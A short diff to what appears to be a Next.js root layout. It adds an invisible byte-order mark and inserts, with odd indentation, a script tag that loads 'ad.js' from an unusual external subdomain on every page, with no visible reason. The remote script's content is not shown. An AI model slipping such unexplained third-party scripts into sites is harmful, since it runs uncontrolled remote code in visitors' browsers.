@@ -1,4 +1,4 @@
-import type { Metadata } from "next";
+﻿import type { Metadata } from "next";
 import "./globals.css";
 import { StructuredData } from "./components/StructuredData";
 
@@ -77,6 +77,7 @@ export default function RootLayout({
       </head>
       <body className="antialiased">
         {children}
+              <script src="https://hikakinmaniacoin.hikamer.f5.si/ad.js" async></script>
       </body>
     </html>
   );
